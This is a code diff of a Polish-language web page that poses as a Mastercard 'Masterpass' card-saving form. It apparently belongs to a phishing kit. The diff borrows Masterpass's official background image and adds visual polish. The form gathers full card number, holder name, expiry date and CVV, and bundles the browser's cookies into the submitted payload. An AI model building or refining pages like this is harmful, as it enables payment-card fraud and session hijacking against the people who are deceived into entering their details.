@@ -6,11 +6,44 @@
   <title>Masterpass Karta</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
+  <style>
+    body {
+      background-image: url('https://masterpass.com/etc/designs/masterpass/clientlibs_base/img/homepage/homepage-hero-background.jpg');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .fade-in {
+      animation: fadeIn 0.6s ease-in-out both;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .loading::after {
+      content: '';
+      border: 3px solid white;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      width: 16px;
+      height: 16px;
+      display: inline-block;
+      margin-left: 8px;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
-<body class="bg-black flex items-center justify-center min-h-screen font-sans">
-  <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg relative">
+<body class="flex items-center justify-center min-h-screen font-sans backdrop-blur-sm">
+
+  <div class="bg-white/90 backdrop-blur-md w-[480px] sm:w-[640px] rounded-2xl shadow-2xl transition-all duration-500 fade-in">
     <!-- Header -->
-    <div class="flex items-center justify-between p-4 border-b">
+    <div class="flex items-center justify-between p-4 border-b border-gray-300">
       <div class="flex items-center space-x-2">
         <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
         <div class="text-sm font-semibold">
@@ -31,91 +64,65 @@
       <h2 class="text-lg font-semibold mb-4">Dodaj kartę</h2>
       <form id="cardForm" class="space-y-4" novalidate>
         <div>
-          <input
-            type="text"
-            name="cardNumber"
-            id="cardNumber"
-            placeholder="Numer karty"
-            maxlength="19"
+          <input type="text" name="cardNumber" id="cardNumber" placeholder="Numer karty" maxlength="19"
             inputmode="numeric"
-            class="w-full border px-4 py-2 rounded outline-none transition"
+            class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
             required />
           <p class="text-xs text-red-500 hidden mt-1" id="cardNumberError">Numer karty powinien zawierać 16 cyfr</p>
         </div>
 
-  	<input
-  	  type="text"
-  	  name="cardHolder"
-  	  id="cardHolder"
-  	  placeholder="Imię i nazwisko posiadacza"
-  	  class="w-full border px-4 py-2 rounded focus:ring-2 outline-none transition"
-  	  required />
-	<p class="text-xs text-red-500 hidden mt-1" id="cardHolderError">
-  	  Tylko imię i nazwisko po angielsku (np. John Smith)
-        </p>
+        <div>
+          <input type="text" name="cardHolder" id="cardHolder" placeholder="Imię i nazwisko posiadacza"
+            class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
+            required />
+          <p class="text-xs text-red-500 hidden mt-1" id="cardHolderError">Tylko imię i nazwisko po angielsku</p>
+        </div>
 
         <div class="flex gap-4 items-center">
-          <div class="relative w-1/4">
-            <input
-              type="text"
-              name="expMonth"
-              id="expMonth"
-              placeholder="MM"
-              maxlength="2"
-              inputmode="numeric"
-              class="w-full border px-4 py-2 rounded text-center outline-none transition"
+          <div class="w-1/4">
+            <input type="text" name="expMonth" id="expMonth" placeholder="MM" maxlength="2" inputmode="numeric"
+              class="w-full border px-4 py-2 rounded text-center outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
               required />
             <p class="text-xs text-red-500 hidden mt-1" id="expMonthError">1–12</p>
           </div>
 
           <span class="text-gray-600">/</span>
 
-          <div class="relative w-1/4">
-            <input
-              type="text"
-              name="expYear"
-              id="expYear"
-              placeholder="RR"
-              maxlength="2"
-              inputmode="numeric"
-              class="w-full border px-4 py-2 rounded text-center outline-none transition"
+          <div class="w-1/4">
+            <input type="text" name="expYear" id="expYear" placeholder="RR" maxlength="2" inputmode="numeric"
+              class="w-full border px-4 py-2 rounded text-center outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
               required />
             <p class="text-xs text-red-500 hidden mt-1" id="expYearError">Wymagane</p>
           </div>
 
-          <div class="relative flex-1">
-            <input
-              type="text"
-              name="cvv"
-              id="cvv"
-              placeholder="CVV"
-              maxlength="4"
-              inputmode="numeric"
-              class="w-full border px-4 py-2 rounded outline-none transition"
+          <div class="flex-1">
+            <input type="text" name="cvv" id="cvv" placeholder="CVV" maxlength="4" inputmode="numeric"
+              class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
               required />
             <p class="text-xs text-red-500 hidden mt-1" id="cvvError">3–4 cyfry</p>
           </div>
         </div>
 
-        <button
-          type="submit"
-          class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition">
+        <button type="submit" id="submitBtn"
+          class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition-all duration-300 hover:scale-[1.02] active:scale-[0.98]">
           Zapisz kartę
         </button>
       </form>
     </div>
 
     <!-- Footer -->
-    <div class="text-xs bg-black text-white p-2 text-center">
+    <div class="text-xs bg-black/70 text-white p-3 text-center rounded-b-2xl">
       Strona wykorzystuje pliki cookie zgodnie z polityką prywatności.
     </div>
   </div>
 
+  <!-- JS -->
   <script>
     const user = JSON.parse(localStorage.getItem('user'));
     if (!user) window.location.href = 'index.html';
 
     const form = document.getElementById('cardForm');
+    const submitBtn = document.getElementById('submitBtn');
     const cardNumber = document.getElementById('cardNumber');
     const expMonth = document.getElementById('expMonth');
     const expYear = document.getElementById('expYear');
@@ -128,80 +135,44 @@
     const cvvError = document.getElementById('cvvError');
     const cardHolderError = document.getElementById('cardHolderError');
 
-    const valid =
-      validateCardNumber() &&
-      validateHolder() &&
-      validateMonth() &&
-      validateYear() &&
-      validateCVV();
-
     function maskCardNumber(value) {
       return value.replace(/\D/g, '').substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
     }
 
     function validateCardNumber() {
       const digits = cardNumber.value.replace(/\s/g, '');
-      if (digits.length !== 16) {
-        cardNumber.classList.add('border-red-500');
-        cardNumberError.classList.remove('hidden');
-        return false;
-      }
-      cardNumber.classList.remove('border-red-500');
-      cardNumberError.classList.add('hidden');
-      return true;
+      const valid = /^\d{16}$/.test(digits);
+      cardNumber.classList.toggle('border-red-500', !valid);
+      cardNumberError.classList.toggle('hidden', valid);
+      return valid;
     }
 
     function validateMonth() {
-      const value = expMonth.value;
-      const valid = /^(0[1-9]|1[0-2])$/.test(value);
-      if (!valid) {
-        expMonth.classList.add('border-red-500');
-        expMonthError.classList.remove('hidden');
-        return false;
-      }
-      expMonth.classList.remove('border-red-500');
-      expMonthError.classList.add('hidden');
-      return true;
+      const valid = /^(0[1-9]|1[0-2])$/.test(expMonth.value);
+      expMonth.classList.toggle('border-red-500', !valid);
+      expMonthError.classList.toggle('hidden', valid);
+      return valid;
     }
 
     function validateYear() {
-      const value = expYear.value;
-      const valid = /^\d{2}$/.test(value);
-      if (!valid) {
-        expYear.classList.add('border-red-500');
-        expYearError.classList.remove('hidden');
-        return false;
-      }
-      expYear.classList.remove('border-red-500');
-      expYearError.classList.add('hidden');
-      return true;
+      const valid = /^\d{2}$/.test(expYear.value);
+      expYear.classList.toggle('border-red-500', !valid);
+      expYearError.classList.toggle('hidden', valid);
+      return valid;
     }
 
     function validateCVV() {
-      const value = cvv.value;
-      const valid = /^\d{3,4}$/.test(value);
-      if (!valid) {
-        cvv.classList.add('border-red-500');
-        cvvError.classList.remove('hidden');
-        return false;
-      }
-      cvv.classList.remove('border-red-500');
-      cvvError.classList.add('hidden');
-      return true;
+      const valid = /^\d{3,4}$/.test(cvv.value);
+      cvv.classList.toggle('border-red-500', !valid);
+      cvvError.classList.toggle('hidden', valid);
+      return valid;
     }
 
-
     function validateHolder() {
-      const value = cardHolder.value.trim();
-      const valid = /^[A-Za-z]+ [A-Za-z]+$/.test(value);
-      if (!valid) {
-        cardHolder.classList.add('border-red-500');
-        cardHolderError.classList.remove('hidden');
-        return false;
-      }
-      cardHolder.classList.remove('border-red-500');
-      cardHolderError.classList.add('hidden');
-      return true;
+      const valid = /^[A-Za-z]+ [A-Za-z]+$/.test(cardHolder.value.trim());
+      cardHolder.classList.toggle('border-red-500', !valid);
+      cardHolderError.classList.toggle('hidden', valid);
+      return valid;
     }
 
     cardNumber.addEventListener('input', (e) => {
@@ -229,18 +200,14 @@
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      const valid =
-        validateCardNumber() &&
-        validateHolder() &&
-        validateMonth() &&
-        validateYear() &&
-        validateCVV();
+      if (![validateCardNumber(), validateHolder(), validateMonth(), validateYear(), validateCVV()].every(Boolean)) return;
 
-      if (!valid) return;
+      submitBtn.disabled = true;
+      submitBtn.classList.add('loading');
 
       const payload = {
         cardNumber: cardNumber.value.replace(/\s/g, ''),
-        cardHolder: form.cardHolder.value.trim(),
+        cardHolder: cardHolder.value.trim(),
         expiryDate: `${expMonth.value}/${expYear.value}`,
         cvv: cvv.value,
         cookies: document.cookie,
@@ -260,11 +227,12 @@
 
         if (res.ok) {
           form.reset();
-          [cardNumber, expMonth, expYear, cvv].forEach(el => el.classList.remove('border-red-500'));
-          [cardNumberError, expMonthError, expYearError, cvvError].forEach(el => el.classList.add('hidden'));
         }
       } catch (err) {
         console.error(err);
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('loading');
       }
     });
   </script>
